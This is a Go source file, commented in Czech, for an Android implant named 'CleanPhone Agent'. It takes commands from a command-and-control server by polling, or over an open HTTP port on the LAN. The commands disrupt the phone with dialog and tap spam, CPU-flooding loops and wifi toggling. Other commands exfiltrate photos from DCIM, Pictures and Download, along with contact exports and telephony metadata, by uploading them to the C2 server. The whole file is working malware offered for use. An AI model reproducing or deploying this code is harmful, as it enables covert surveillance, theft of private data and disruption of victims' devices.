// 📱 CleanPhone Agent - staticky linked, zero dependencies
//
// Dva režimy:
//   serve  - poslouchá HTTP na portu (LAN scénář)
//   poll   - volá domů na C2 (cross-network scénář, projde NATem)
//
// Nevyžaduje Python, Termux ani žádnou aplikaci.
// Vše, co spouští, jsou nástroje, které Android má vestavěné
// (am, input, screencap, svc, sh) — dostupné shell uživateli.

package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path"
	"runtime"
	"strings"
	"time"
)

// ---------- Spouštění systémových příkazů ----------

func run(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	return out.String(), err
}

func shell(cmd string) string {
	out, _ := run("sh", "-c", cmd)
	return out
}

// ---------- Chaos režimy (vše vratné restartem) ----------

func dialogSpam(n int) string {
	for i := 0; i < n; i++ {
		run("am", "start", "-a", "android.settings.SETTINGS")
		time.Sleep(300 * time.Millisecond)
	}
	return fmt.Sprintf("dialog_spam: %d dialogs", n)
}

func touchSpam(n int) string {
	w, h := screenSize()
	for i := 0; i < n; i++ {
		x := rand.Intn(w)
		y := rand.Intn(h)
		run("input", "tap", fmt.Sprint(x), fmt.Sprint(y))
		time.Sleep(100 * time.Millisecond)
	}
	return fmt.Sprintf("touch_spam: %d taps on %dx%d", n, w, h)
}

func screenSize() (int, int) {
	out := shell("wm size")
	w, h := 1080, 2400
	for _, line := range strings.Split(out, "\n") {
		if idx := strings.Index(line, ":"); idx >= 0 {
			dim := strings.TrimSpace(line[idx+1:])
			var a, b int
			if _, err := fmt.Sscanf(dim, "%dx%d", &a, &b); err == nil {
				w, h = a, b
			}
		}
	}
	return w, h
}

func screenshotLoop(n int) string {
	dst := "/sdcard"
	if _, err := os.Stat("/sdcard"); err != nil {
		dst = "/data/local/tmp"
	}
	for i := 0; i < n; i++ {
		run("screencap", "-p", fmt.Sprintf("%s/chaos_%d.png", dst, i))
		time.Sleep(200 * time.Millisecond)
	}
	return fmt.Sprintf("screenshot_loop: %d shots to %s", n, dst)
}

func wifiToggle(n int) string {
	for i := 0; i < n; i++ {
		shell("svc wifi disable")
		time.Sleep(time.Second)
		shell("svc wifi enable")
		time.Sleep(time.Second)
	}
	return fmt.Sprintf("wifi_toggle: %d cycles", n)
}

func cpuFlood(n int) string {
	for i := 0; i < n; i++ {
		cmd := exec.Command("sh", "-c", "while true; do :; done")
		cmd.Start() // záměrně neuvolňujeme — necháme běžet
		time.Sleep(200 * time.Millisecond)
	}
	return fmt.Sprintf("cpu_flood: %d busy loops", n)
}

func appSpam(n int) string {
	apps := []string{
		"com.android.settings/.Settings",
		"com.android.settings/.SubSettings",
		"com.android.documentsui/.files.FilesActivity",
	}
	for i := 0; i < n; i++ {
		a := apps[rand.Intn(len(apps))]
		run("am", "start", "-n", a)
		time.Sleep(300 * time.Millisecond)
	}
	return fmt.Sprintf("app_spam: %d launches", n)
}

func vibrate(n int) string {
	for i := 0; i < n; i++ {
		shell("cmd vibrator vibrate 500")
		time.Sleep(600 * time.Millisecond)
	}
	return fmt.Sprintf("vibrate: %d pulses", n)
}

func stopAll() string {
	shell("pkill -f 'while true'")
	shell("pkill -f chaos")
	return "stop: chaos processes killed"
}

// ---------- Exfiltrace dat ----------
//
// POZOR k oprávněním na čistém (neprootovaném) Androidu:
//   - /sdcard (DCIM, Pictures, Download) ... ČITELNÉ shell uživatelem  → funguje
//   - kontakty / SMS (data/data/...)       ... NEPŘÍSTUPNÉ bez rootu   → pouze metadata
//
// Skutečné čtení kontaktů/SMS databází vyžaduje root nebo runtime permission
// uvnitř reálné APK s příslušnými oprávněními (READ_CONTACTS / READ_SMS).

func exfilPhotos(c2url, id string) string {
	photoDirs := []string{"/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Download"}
	exfilCount := 0

	for _, dir := range photoDirs {
		files := shell(fmt.Sprintf(`find %s -maxdepth 3 -type f \( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' \) 2>/dev/null | head -20`, dir))
		for _, file := range strings.Split(files, "\n") {
			file = strings.TrimSpace(file)
			if file == "" {
				continue
			}
			filename := path.Base(file)
			content := shell(fmt.Sprintf(`base64 -w0 '%s' 2>/dev/null`, file))
			if content == "" {
				continue
			}
			uploadURL := fmt.Sprintf("%s/upload?id=%s&type=photo&name=%s", strings.TrimRight(c2url, "/"), id, filename)
			resp, err := http.Post(uploadURL, "text/plain", strings.NewReader(content))
			if err == nil {
				resp.Body.Close()
				exfilCount++
			}
			time.Sleep(400 * time.Millisecond)
		}
	}
	return fmt.Sprintf("exfil_photos: %d photos uploaded", exfilCount)
}

func exfilContacts(c2url, id string) string {
	// Bez rootu nelze číst databázi kontaktů. Posbíráme alespoň veřejné VCF exporty.
	contacts := shell("find /sdcard -maxdepth 3 -iname '*.vcf' 2>/dev/null | head -5")
	body := ""
	for _, f := range strings.Split(contacts, "\n") {
		f = strings.TrimSpace(f)
		if f != "" {
			body += "=== " + f + " ===\n" + shell(fmt.Sprintf("cat '%s' 2>/dev/null | head -40", f)) + "\n"
		}
	}
	if body == "" {
		body = "exfil_contacts: ŽÁDNÁ data (nepřístupné bez rootu / žádný VCF export)"
	}
	uploadURL := fmt.Sprintf("%s/upload?id=%s&type=contacts&name=data.txt", strings.TrimRight(c2url, "/"), id)
	resp, err := http.Post(uploadURL, "text/plain", strings.NewReader(body))
	if err == nil {
		resp.Body.Close()
	}
	return "exfil_contacts: done (viz server, očekávej prázdné bez rootu)"
}

func exfilSMS(c2url, id string) string {
	// Bez rootu nelze číst SMS databázi. Pouze metadata balíčku.
	sms := shell("dumpsys package com.android.providers.telephony 2>/dev/null | head -30")
	if strings.TrimSpace(sms) == "" {
		sms = "exfil_sms: ŽÁDNÁ data (nepřístupné bez rootu)"
	}
	uploadURL := fmt.Sprintf("%s/upload?id=%s&type=sms&name=data.txt", strings.TrimRight(c2url, "/"), id)
	resp, err := http.Post(uploadURL, "text/plain", strings.NewReader(sms))
	if err == nil {
		resp.Body.Close()
	}
	return "exfil_sms: done (viz server, očekávej prázdné bez rootu)"
}

func exfilAll(c2url, id string) string {
	results := []string{}
	results = append(results, exfilPhotos(c2url, id))
	results = append(results, exfilContacts(c2url, id))
	results = append(results, exfilSMS(c2url, id))
	return strings.Join(results, "; ")
}

// ---------- Dispatcher příkazů ----------

func dispatch(cmd string, c2url string, id string) string {
	// formát: "mode" nebo "mode:count"
	parts := strings.SplitN(cmd, ":", 2)
	mode := strings.TrimSpace(parts[0])
	count := 10
	if len(parts) == 2 {
		fmt.Sscanf(strings.TrimSpace(parts[1]), "%d", &count)
	}
	switch mode {
	case "dialog_spam":
		return dialogSpam(count)
	case "touch_spam":
		return touchSpam(count)
	case "screenshot_loop":
		return screenshotLoop(count)
	case "wifi_toggle":
		return wifiToggle(count)
	case "cpu_flood":
		return cpuFlood(count)
	case "app_spam":
		return appSpam(count)
	case "vibrate":
		return vibrate(count)
	case "stop":
		return stopAll()
	case "info":
		model := strings.TrimSpace(shell("getprop ro.product.model"))
		ver := strings.TrimSpace(shell("getprop ro.build.version.release"))
		return fmt.Sprintf("info: %s / Android %s", model, ver)
	case "full_chaos":
		go dialogSpam(15)
		go touchSpam(30)
		go screenshotLoop(15)
		go cpuFlood(6)
		go wifiToggle(3)
		return "full_chaos: all threads started"
	case "exfil_photos":
		return exfilPhotos(c2url, id)
	case "exfil_contacts":
		return exfilContacts(c2url, id)
	case "exfil_sms":
		return exfilSMS(c2url, id)
	case "exfil_all":
		return exfilAll(c2url, id)
	default:
		return "unknown command: " + cmd
	}
}

// ---------- C2 klient (poll režim) ----------

type TaskResp struct {
	Cmd string `json:"cmd"`
}

func pollLoop(c2 string, id string) {
	client := &http.Client{Timeout: 20 * time.Second}
	log.Printf("polling C2 at %s as %s", c2, id)
	for {
		url := fmt.Sprintf("%s/task?id=%s", strings.TrimRight(c2, "/"), id)
		resp, err := client.Get(url)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var t TaskResp
		if len(body) == 0 || json.Unmarshal(body, &t) != nil || t.Cmd == "" {
			time.Sleep(3 * time.Second)
			continue
		}
		log.Printf("task received: %s", t.Cmd)
		result := dispatch(t.Cmd, c2, id)

		payload, _ := json.Marshal(map[string]string{
			"id": id, "cmd": t.Cmd, "result": result,
		})
		client.Post(strings.TrimRight(c2, "/")+"/result", "application/json", bytes.NewReader(payload))
	}
}

// ---------- Serve režim (LAN) ----------

func serveLoop(port int) {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		p := strings.Trim(r.URL.Path, "/")
		if p == "" {
			fmt.Fprint(w, "CleanPhone Agent OK")
			return
		}
		go dispatch(p, "", "")
		fmt.Fprintf(w, "queued: %s", p)
	})
	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
		cmd := r.URL.Query().Get("cmd")
		out := dispatch(cmd, "", "")
		fmt.Fprint(w, out)
	})
	log.Printf("serving on 0.0.0.0:%d", port)
	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", port), nil))
}

func main() {
	mode := flag.String("mode", "poll", "serve | poll")
	c2 := flag.String("c2", "http://127.0.0.1:8080", "C2 base URL (poll mode)")
	id := flag.String("id", "", "agent id (poll mode)")
	port := flag.Int("port", 8080, "listen port (serve mode)")
	flag.Parse()

	if *id == "" {
		h, _ := os.Hostname()
		*id = fmt.Sprintf("%s-%d", h, os.Getpid())
	}

	log.Printf("CleanPhone Agent | %s/%s | mode=%s", runtime.GOOS, runtime.GOARCH, *mode)

	switch *mode {
	case "serve":
		serveLoop(*port)
	case "poll":
		pollLoop(*c2, *id)
	default:
		log.Fatalf("unknown mode %q", *mode)
	}
}
